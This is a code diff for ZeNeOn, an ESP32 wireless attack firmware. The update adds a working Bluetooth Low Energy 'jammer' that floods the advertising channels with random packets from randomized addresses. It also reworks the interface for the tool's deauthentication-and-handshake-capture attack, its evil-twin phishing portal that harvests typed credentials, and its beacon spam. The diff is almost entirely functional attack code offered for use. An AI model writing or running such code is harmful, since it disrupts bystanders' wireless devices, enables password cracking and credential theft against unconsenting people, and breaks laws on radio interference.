@@ -6,6 +6,10 @@
 #include <DNSServer.h>
 #include <WebServer.h>
 #include <WiFi.h>
+#include "esp_bt.h"
+#include "esp_bt_main.h"
+#include "esp_gap_ble_api.h"
+#include "esp_bt_defs.h"
 
 WebServer server(80);
 DNSServer dnsServer;
@@ -16,6 +20,11 @@ bool deauthing = false;
 bool spamming = false;
 bool evilTwinActive = false;
 bool capturingHandshake = false;
+bool btJamming = false;
+unsigned long btJamEndTime = 0;
+unsigned long btJamStartTime = 0;
+unsigned long lastBtJam = 0;
+uint32_t btJamPktsSent = 0;
 unsigned long deauthEndTime = 0;
 unsigned long deauthStartTime = 0;
 unsigned long lastDeauth = 0;
@@ -243,7 +252,7 @@ input::placeholder{color:rgba(0,160,255,0.35)}
 .footer a:hover{color:#fff}
 @media(max-width:600px){.grid{grid-template-columns:1fr}.eapol-grid{grid-template-columns:1fr 1fr}}
 </style></head><body>
-<div class="top"><h1>{ZeNeOn}</h1><div class="sub">ESP32 WiFi Security Framework v5.0</div></div>
+<div class="top"><h1>{ZeNeOn}</h1><div class="sub">ESP32 WiFi Security Framework v5.1</div></div>
 <div class="container">
 )rawliteral";
 }
@@ -255,12 +264,13 @@ String homeUI() {
 <button onclick="location.href='/deauth'">☢ Deauth + Handshake Capture</button>
 <button class="secondary" onclick="location.href='/evilui'">👁 Evil Twin Attack</button>
 <button class="secondary" onclick="location.href='/spamui'">📡 WiFi Spam</button>
+<button class="secondary" onclick="location.href='/btjamui'">🔵 Bluetooth Jammer</button>
 </div>
 <div class="card">
 <h3>System Info</h3>
-<div class="status">AP SSID: ZeNeOn | Status: Online | Framework: v5.0</div>
+<div class="status">AP SSID: ZeNeOn | Status: Online | Framework: v5.1</div>
 </div>
-<div class="footer">Made by <a href="https://github.com/InoshMatheesha" target="_blank">MoOdY69</a> | ZeNeOn Framework v5.0</div>
+<div class="footer">Made by <a href="https://github.com/InoshMatheesha" target="_blank">MoOdY69</a> | ZeNeOn Framework v5.1</div>
 </div></body></html>
 )rawliteral";
 }
@@ -271,26 +281,7 @@ String deauthUI() {
 <div class="card">
 <h3>Step 1: Select Target</h3>
 <div id="status" class="status hidden"></div>
-<div id="networks">
-)rawliteral";
-  int n = WiFi.scanNetworks(false, true);
-  if (n == 0) {
-    h += "<div class='status error'>No networks found. Try refreshing.</div>";
-  } else {
-    for (int i = 0; i < n; i++) {
-      String ssid = WiFi.SSID(i);
-      if (ssid.length() == 0)
-        ssid = "Hidden Network";
-      h += "<div class='net-item' id='net" + String(i) +
-           "' onclick=\"selectTarget(" + String(i) + ",'" + ssid + "','" +
-           WiFi.BSSIDstr(i) + "'," + String(WiFi.channel(i)) + ")\">" +
-           "<div><div class='net-name'>" + ssid + "</div>" +
-           "<div class='net-details'>CH " + String(WiFi.channel(i)) +
-           " | RSSI " + String(WiFi.RSSI(i)) + " dBm | " + WiFi.BSSIDstr(i) +
-           "</div></div></div>";
-    }
-  }
-  h += R"rawliteral(
+<div id="networks"><div class="status">Scanning networks...</div>
 </div>
 <button class="secondary" style="margin-top:15px" id="rescanBtn" onclick="rescanNetworks()">⟳ Rescan Networks</button>
 </div>
@@ -362,11 +353,39 @@ String deauthUI() {
 <button class="danger" onclick="stopAll()">⬛ Stop All + Save</button>
 </div>
 
+<div id="reconnOverlay" style="display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.85);z-index:9999;display:none;align-items:center;justify-content:center;flex-direction:column">
+<div style="text-align:center;padding:30px">
+<div style="font-size:22px;color:#ffaa00;margin-bottom:15px">⚡ Switching Channel...</div>
+<div style="color:#5599cc;font-size:14px;margin-bottom:10px">AP is restarting on target channel.</div>
+<div style="color:#00d4ff;font-size:13px">Auto-reconnecting<span id="reconDots">...</span></div>
+<div style="margin-top:15px;color:#5599cc;font-size:12px">If not auto-reconnected, manually rejoin <strong>ZeNeOn</strong> WiFi</div>
+</div></div>
 <button class="secondary" onclick="location.href='/'">← Back to Home</button>
 <script>
 let targetSSID='',selectedId=-1,clientPoll=null,statusPoll=null,attackActive=false,lastLogId=0,logPoll=null;
-
-function rescanNetworks(){
+var retryFetch=function(url,opts,retries,delay_ms){
+  retries=retries||8;delay_ms=delay_ms||1500;
+  return fetch(url,opts).catch(function(e){
+    if(retries<=0) throw e;
+    return new Promise(function(r){setTimeout(r,delay_ms);}).then(function(){return retryFetch(url,opts,retries-1,delay_ms);});
+  });
+}
+var showReconnOverlay=function(){
+  let o=document.getElementById('reconnOverlay');
+  o.style.display='flex';
+  let dots=0;
+  let iv=setInterval(function(){
+    dots=(dots+1)%4;
+    document.getElementById('reconDots').textContent='.'.repeat(dots+1);
+  },400);
+var checkConn=function(){
+    fetch('/clients',{signal:AbortSignal.timeout(2000)}).then(function(){
+      o.style.display='none';clearInterval(iv);
+    }).catch(function(){setTimeout(checkConn,1500);});
+  }
+  setTimeout(checkConn,2000);
+}
+var rescanNetworks=function(){
   let btn=document.getElementById('rescanBtn');
   btn.disabled=true;btn.textContent='⟳ Scanning...';
   fetch('/scan').then(r=>r.json()).then(nets=>{
@@ -390,7 +409,9 @@ function rescanNetworks(){
   });
 }
 
-function selectTarget(id,s,b,c){
+// Auto-scan on page load
+window.addEventListener('load',function(){rescanNetworks();});
+var selectTarget=function(id,s,b,c){
   if(selectedId>=0){var prev=document.getElementById('net'+selectedId);if(prev)prev.classList.remove('selected');}
   selectedId=id;
   document.getElementById('net'+id).classList.add('selected');
@@ -412,8 +433,7 @@ function selectTarget(id,s,b,c){
     },2000);
   });
 }
-
-function autoAttack(t){
+var autoAttack=function(t){
   if(!targetSSID){
     document.getElementById('status').className='status warning';
     document.getElementById('status').classList.remove('hidden');
@@ -429,15 +449,14 @@ function autoAttack(t){
   fetch('/autoattack?time='+t).then(r=>r.text()).then(d=>{
     document.getElementById('status').className='status';
     document.getElementById('status').innerHTML='☢ Auto Attack Started on '+targetSSID+' ('+t+'s)';
-    startStatusPoll(t);
-    startLogPoll();
+    showReconnOverlay();
+    setTimeout(function(){startStatusPoll(t);startLogPoll();},3000);
   });
 }
-
-function clearTerminal(){
+var clearTerminal=function(){
   document.getElementById('terminal').innerHTML='';
 }
-function addTermLine(msg,color){
+var addTermLine=function(msg,color){
   let term=document.getElementById('terminal');
   let line=document.createElement('div');
   if(color) line.style.color=color;
@@ -445,12 +464,11 @@ function addTermLine(msg,color){
   term.appendChild(line);
   term.scrollTop=term.scrollHeight;
 }
-
-function startLogPoll(){
+var startLogPoll=function(){
   if(logPoll) clearInterval(logPoll);
   lastLogId=0;
   logPoll=setInterval(function(){
-    fetch('/eventlog?since='+lastLogId).then(r=>r.json()).then(d=>{
+    retryFetch('/eventlog?since='+lastLogId,{},3,1000).then(r=>r.json()).then(d=>{
       if(d.id) lastLogId=d.id;
       if(d.logs && d.logs.length>0){
         d.logs.forEach(function(l){
@@ -466,12 +484,11 @@ function startLogPoll(){
     }).catch(function(){});
   },800);
 }
-
-function startStatusPoll(totalTime){
+var startStatusPoll=function(totalTime){
   if(statusPoll) clearInterval(statusPoll);
   let startT=Date.now();
   statusPoll=setInterval(function(){
-    fetch('/capturestatus').then(r=>r.json()).then(d=>{
+    retryFetch('/capturestatus',{},3,1000).then(r=>r.json()).then(d=>{
       document.getElementById('m1').textContent=d.m1;
       document.getElementById('m2').textContent=d.m2;
       document.getElementById('m3').textContent=d.m3;
@@ -534,8 +551,7 @@ function startStatusPoll(totalTime){
     }).catch(e=>{});
   },800);
 }
-
-function showDownload(d){
+var showDownload=function(d){
   let dlCard=document.getElementById('dlCard');
   dlCard.classList.remove('hidden');
   let quality='';
@@ -547,8 +563,7 @@ function showDownload(d){
   document.getElementById('status').innerHTML=d.handshake?'✓ Attack complete — Handshake captured!':'⚠ Attack complete — '+d.eapol+' EAPOL frames';
   addTermLine(d.handshake?'★ ATTACK COMPLETE — HANDSHAKE CAPTURED!':'⚠ ATTACK COMPLETE — '+d.eapol+' EAPOL frames',d.handshake?'#00ff88':'#ffaa00');
 }
-
-function manualSniff(){
+var manualSniff=function(){
   fetch('/sniff').then(r=>r.text()).then(d=>{
     document.getElementById('status').className='status';
     document.getElementById('status').classList.remove('hidden');
@@ -561,8 +576,7 @@ function manualSniff(){
     startLogPoll();
   });
 }
-
-function stopAll(){
+var stopAll=function(){
   if(clientPoll) clearInterval(clientPoll);
   if(statusPoll) clearInterval(statusPoll);
   if(logPoll) clearInterval(logPoll);
@@ -579,7 +593,7 @@ function stopAll(){
   });
 }
 </script>
-<div class="footer">Made by <a href="https://github.com/InoshMatheesha" target="_blank">MoOdY69</a> | ZeNeOn Framework v5.0</div>
+<div class="footer">Made by <a href="https://github.com/InoshMatheesha" target="_blank">MoOdY69</a> | ZeNeOn Framework v5.1</div>
 </div></body></html>
 )rawliteral";
   return h;
@@ -607,7 +621,7 @@ String evilUI() {
 <button class="secondary" onclick="location.href='/'">&#8592; Back to Home</button>
 <script>
 let credPoll=null;
-function startEvil(){
+var startEvil=function(){
   let ssid=document.getElementById('s').value;
   let tpl=document.getElementById('tpl').value;
   if(!ssid){
@@ -624,7 +638,7 @@ function startEvil(){
     pollCreds();
   });
 }
-function stopEvil(){
+var stopEvil=function(){
   if(credPoll) clearInterval(credPoll);
   fetch('/stopevil').then(r=>r.text()).then(d=>{
     document.getElementById('status').className='status';
@@ -633,8 +647,8 @@ function stopEvil(){
     document.getElementById('credCount').classList.add('hidden');
   });
 }
-function getCreds(){ window.location.href='/getcreds'; }
-function pollCreds(){
+var getCreds=function(){ window.location.href='/getcreds'; }
+var pollCreds=function(){
   credPoll=setInterval(function(){
     fetch('/credstats').then(r=>r.text()).then(d=>{
       if(d!='0'){
@@ -645,7 +659,7 @@ function pollCreds(){
   },3000);
 }
 </script>
-<div class="footer">Made by <a href="https://github.com/InoshMatheesha" target="_blank">MoOdY69</a> | ZeNeOn Framework v5.0</div>
+<div class="footer">Made by <a href="https://github.com/InoshMatheesha" target="_blank">MoOdY69</a> | ZeNeOn Framework v5.1</div>
 </div></body></html>
 )rawliteral";
 }
@@ -666,14 +680,14 @@ String spamUI() {
 </div>
 <button class="secondary" onclick="location.href='/'">← Back to Home</button>
 <script>
-function startSpam(c){
+var startSpam=function(c){
   fetch('/spam?count='+c).then(r=>r.text()).then(d=>{
     document.getElementById('status').className='status';
     document.getElementById('status').classList.remove('hidden');
     document.getElementById('status').innerHTML='📡 Spamming '+c+' fake networks...';
   });
 }
-function stopSpam(){
+var stopSpam=function(){
   fetch('/stop').then(r=>r.text()).then(d=>{
     document.getElementById('status').className='status';
     document.getElementById('status').classList.remove('hidden');
@@ -681,7 +695,87 @@ function stopSpam(){
   });
 }
 </script>
-<div class="footer">Made by <a href="https://github.com/InoshMatheesha" target="_blank">MoOdY69</a> | ZeNeOn Framework v5.0</div>
+<div class="footer">Made by <a href="https://github.com/InoshMatheesha" target="_blank">MoOdY69</a> | ZeNeOn Framework v5.1</div>
+</div></body></html>
+)rawliteral";
+}
+
+/* ============ BLUETOOTH JAMMER UI ============ */
+String btJamUI() {
+  return header() + R"rawliteral(
+<div class="card">
+<h3>Bluetooth Jammer</h3>
+<p style="margin-bottom:15px;opacity:0.7">Flood BLE advertisement channels with noise to disrupt nearby Bluetooth devices</p>
+<div id="status" class="status hidden"></div>
+<div class="grid">
+<button onclick="startBtJam(15)">15 Sec</button>
+<button onclick="startBtJam(30)">30 Sec</button>
+<button onclick="startBtJam(60)">60 Sec</button>
+<button onclick="startBtJam(120)">120 Sec</button>
+</div>
+<button class="danger" style="margin-top:15px" onclick="stopBtJam()">⬛ Stop Jammer</button>
+<div id="liveCard" class="card hidden" style="margin-top:15px">
+<h3>Jammer Status</h3>
+<div class="capture-quality">
+<div class="cq-item"><div class="cq-val" id="btPkts">0</div><div class="cq-lbl">Packets Sent</div></div>
+<div class="cq-item"><div class="cq-val" id="btTime">0s</div><div class="cq-lbl">Elapsed</div></div>
+<div class="cq-item"><div class="cq-val" id="btRemain">0s</div><div class="cq-lbl">Remaining</div></div>
+</div>
+<div class="progress-outer"><div class="progress-inner" id="btProg" style="width:0%"></div></div>
+<div id="btLog" style="margin-top:10px;background:#020408;border:1px solid rgba(0,100,255,0.4);border-radius:8px;padding:10px;height:120px;overflow-y:auto;font-size:12px;color:#00cc66"></div>
+</div>
+</div>
+<button class="secondary" onclick="location.href='/'">← Back to Home</button>
+<script>
+var btPoll=null;
+var startBtJam=function(t){
+  fetch('/btjam?time='+t).then(r=>r.text()).then(d=>{
+    document.getElementById('status').className='status';
+    document.getElementById('status').classList.remove('hidden');
+    document.getElementById('status').innerHTML='🔵 Bluetooth Jammer active for '+t+'s';
+    document.getElementById('liveCard').classList.remove('hidden');
+    addBtLog('🔵 BT Jammer started ('+t+'s)');
+    startBtPoll(t);
+  });
+}
+var stopBtJam=function(){
+  if(btPoll) clearInterval(btPoll);
+  fetch('/stopbtjam').then(r=>r.text()).then(d=>{
+    document.getElementById('status').className='status';
+    document.getElementById('status').classList.remove('hidden');
+    document.getElementById('status').innerHTML='Bluetooth Jammer stopped.';
+    addBtLog('⬛ Jammer stopped');
+  });
+}
+var addBtLog=function(msg){
+  var el=document.getElementById('btLog');
+  var d=document.createElement('div');
+  d.textContent=msg; el.appendChild(d); el.scrollTop=el.scrollHeight;
+}
+var startBtPoll=function(totalTime){
+  var startT=Date.now();
+  if(btPoll) clearInterval(btPoll);
+  btPoll=setInterval(function(){
+    fetch('/btjamstatus').then(r=>r.json()).then(d=>{
+      document.getElementById('btPkts').textContent=d.pkts;
+      var elapsed=Math.round((Date.now()-startT)/1000);
+      document.getElementById('btTime').textContent=elapsed+'s';
+      var remain=Math.max(0,totalTime-elapsed);
+      document.getElementById('btRemain').textContent=remain+'s';
+      var pct=Math.min(100,Math.round((elapsed/totalTime)*100));
+      document.getElementById('btProg').style.width=pct+'%';
+      if(!d.active){
+        clearInterval(btPoll);
+        document.getElementById('status').className='status success';
+        document.getElementById('status').innerHTML='✓ Bluetooth Jam complete — '+d.pkts+' packets sent';
+        document.getElementById('btProg').style.width='100%';
+        addBtLog('✓ Jam complete: '+d.pkts+' packets sent');
+      }
+    }).catch(function(){});
+  },800);
+}
+</script>
+<div class="footer">Made by <a href="https://github.com/InoshMatheesha" target="_blank">MoOdY69</a> | ZeNeOn Framework v5.1</div>
 </div></body></html>
 )rawliteral";
 }
@@ -690,7 +784,7 @@ String captivePortal() {
   String ssid = evilTwinSSID.length() > 0 ? evilTwinSSID : "Free_WiFi";
   String submitJS = R"rawliteral(
 <script>
-function doLogin(e){
+var doLogin=function(e){
   e.preventDefault();
   var u=document.getElementById('u').value,p=document.getElementById('p').value;
   document.getElementById('lo').style.display='flex';
@@ -1215,6 +1309,100 @@ void sendDeauthBurst() {
   yield(); // Let WiFi task breathe so TX actually goes out
 }
 
+/* ============ BLUETOOTH JAMMER ============ */
+static bool btInitialized = false;
+
+void btJamInit() {
+  if (btInitialized) return;
+  esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
+  bt_cfg.mode = ESP_BT_MODE_BLE;
+  if (esp_bt_controller_init(&bt_cfg) != ESP_OK) {
+    Serial.println("[BT] Controller init failed");
+    return;
+  }
+  if (esp_bt_controller_enable(ESP_BT_MODE_BLE) != ESP_OK) {
+    Serial.println("[BT] Controller enable failed");
+    esp_bt_controller_deinit();
+    return;
+  }
+  if (esp_bluedroid_init() != ESP_OK) {
+    Serial.println("[BT] Bluedroid init failed");
+    esp_bt_controller_disable();
+    esp_bt_controller_deinit();
+    return;
+  }
+  if (esp_bluedroid_enable() != ESP_OK) {
+    Serial.println("[BT] Bluedroid enable failed");
+    esp_bluedroid_deinit();
+    esp_bt_controller_disable();
+    esp_bt_controller_deinit();
+    return;
+  }
+  btInitialized = true;
+  Serial.println("[BT] Bluetooth stack initialized");
+}
+
+void btJamDeinit() {
+  if (!btInitialized) return;
+  esp_ble_gap_stop_advertising();
+  delay(50);
+  esp_bluedroid_disable();
+  esp_bluedroid_deinit();
+  esp_bt_controller_disable();
+  esp_bt_controller_deinit();
+  btInitialized = false;
+  Serial.println("[BT] Bluetooth stack released");
+}
+
+void sendBtJamBurst() {
+  // Rapidly cycle through BLE advertising with random data
+  // This floods the 3 BLE advertisement channels (37, 38, 39)
+  for (int burst = 0; burst < 5; burst++) {
+    uint8_t advData[31];
+    for (int i = 0; i < 31; i++) advData[i] = (uint8_t)esp_random();
+    // Set mandatory flags field
+    advData[0] = 0x02; // Length
+    advData[1] = 0x01; // Type: Flags
+    advData[2] = 0x06; // LE General + BR/EDR Not Supported
+    // Rest is random noise
+
+    esp_ble_adv_data_t adv;
+    memset(&adv, 0, sizeof(adv));
+    adv.set_scan_rsp = false;
+    adv.include_name = false;
+    adv.include_txpower = false;
+    adv.min_interval = 0x0006; // Fastest possible (7.5ms)
+    adv.max_interval = 0x0006;
+    adv.appearance = (uint16_t)esp_random();
+    adv.manufacturer_len = 20;
+    adv.p_manufacturer_data = &advData[3];
+    adv.flag = advData[2];
+
+    esp_ble_gap_config_adv_data(&adv);
+
+    esp_ble_adv_params_t advParams;
+    memset(&advParams, 0, sizeof(advParams));
+    advParams.adv_int_min = 0x0020; // 20ms
+    advParams.adv_int_max = 0x0020;
+    advParams.adv_type = ADV_TYPE_NONCONN_IND; // Non-connectable undirected
+    advParams.own_addr_type = BLE_ADDR_TYPE_RANDOM;
+    advParams.channel_map = ADV_CHNL_ALL; // All 3 adv channels
+    advParams.adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY;
+
+    // Randomize the BLE source address each burst
+    esp_bd_addr_t randAddr;
+    for (int i = 0; i < 6; i++) randAddr[i] = (uint8_t)esp_random();
+    randAddr[0] |= 0xC0; // Set as random static address
+    esp_ble_gap_set_rand_addr(randAddr);
+
+    esp_ble_gap_start_advertising(&advParams);
+    btJamPktsSent++;
+    delayMicroseconds(500);
+    esp_ble_gap_stop_advertising();
+    delayMicroseconds(200);
+  }
+}
+
 /* ============ WIFI SPAM ============ */
 void sendBeacon(const char *ssid, int ssidLen, int ch) {
   uint8_t packet[128] = {0};
@@ -1403,6 +1591,7 @@ void setupRoutes() {
   server.on("/deauth", []() { server.send(200, "text/html", deauthUI()); });
   server.on("/evilui", []() { server.send(200, "text/html", evilUI()); });
   server.on("/spamui", []() { server.send(200, "text/html", spamUI()); });
+  server.on("/btjamui", []() { server.send(200, "text/html", btJamUI()); });
 
   /* --- AJAX network scan (no page reload) --- */
   server.on("/scan", []() {
@@ -1785,10 +1974,53 @@ void setupRoutes() {
     server.send(200, "text/plain", "Spamming " + String(c) + " networks");
   });
 
+  /* --- Bluetooth Jammer --- */
+  server.on("/btjam", []() {
+    int t = server.arg("time").toInt();
+    if (t < 5) t = 15;
+    if (t > 300) t = 300;
+    btJamInit();
+    if (!btInitialized) {
+      server.send(500, "text/plain", "BT init failed");
+      return;
+    }
+    btJamPktsSent = 0;
+    btJamStartTime = millis();
+    btJamEndTime = millis() + (unsigned long)t * 1000UL;
+    btJamming = true;
+    lastBtJam = 0;
+    Serial.printf("[BT] Jammer started for %ds\n", t);
+    addEvent("BT Jammer started for " + String(t) + "s");
+    server.send(200, "text/plain", "BT Jam started: " + String(t) + "s");
+  });
+
+  server.on("/stopbtjam", []() {
+    btJamming = false;
+    if (btInitialized) {
+      esp_ble_gap_stop_advertising();
+      btJamDeinit();
+    }
+    Serial.printf("[BT] Jammer stopped: %u pkts\n", btJamPktsSent);
+    addEvent("BT Jammer stopped: " + String(btJamPktsSent) + " pkts");
+    server.send(200, "text/plain", "BT Jam stopped");
+  });
+
+  server.on("/btjamstatus", []() {
+    String json = "{";
+    json += "\"active\":" + String(btJamming ? "true" : "false") + ",";
+    json += "\"pkts\":" + String(btJamPktsSent);
+    json += "}";
+    server.send(200, "application/json", json);
+  });
+
   /* --- Stop everything --- */
   server.on("/stop", []() {
-    bool wasActive = sniffing || deauthing || spamming || capturingHandshake ||
+    bool wasActive = sniffing || deauthing || spamming || btJamming || capturingHandshake ||
                      currentPhase != PHASE_IDLE;
+    if (btJamming) {
+      btJamming = false;
+      if (btInitialized) { esp_ble_gap_stop_advertising(); btJamDeinit(); }
+    }
     bool wasAttacking = currentPhase != PHASE_IDLE;
 
     if (currentPhase != PHASE_IDLE) {
@@ -1842,7 +2074,7 @@ void setup() {
   Serial.begin(115200);
   delay(500);
   Serial.println("\n====================================================");
-  Serial.println("  ZeNeOn v5.0 — Automated Handshake Capture");
+  Serial.println("  ZeNeOn v5.1 — Automated Handshake Capture");
   Serial.println("  Made by MoOdY");
   Serial.println("====================================================\n");
   if (!SPIFFS.begin(true))
@@ -2038,6 +2270,20 @@ void loop() {
     if (now - lastSpam >= 100) {
       spamWiFi();
       lastSpam = now;
+    }
+  }
+
+  /* ---- BLUETOOTH JAMMER ---- */
+  if (btJamming) {
+    if (now >= btJamEndTime) {
+      btJamming = false;
+      esp_ble_gap_stop_advertising();
+      btJamDeinit();
+      Serial.printf("[BT] Jam complete: %u pkts\n", btJamPktsSent);
+      addEvent("BT Jam complete: " + String(btJamPktsSent) + " pkts sent");
+    } else if (now - lastBtJam >= 15) {
+      sendBtJamBurst();
+      lastBtJam = now;
     }
   }
 }
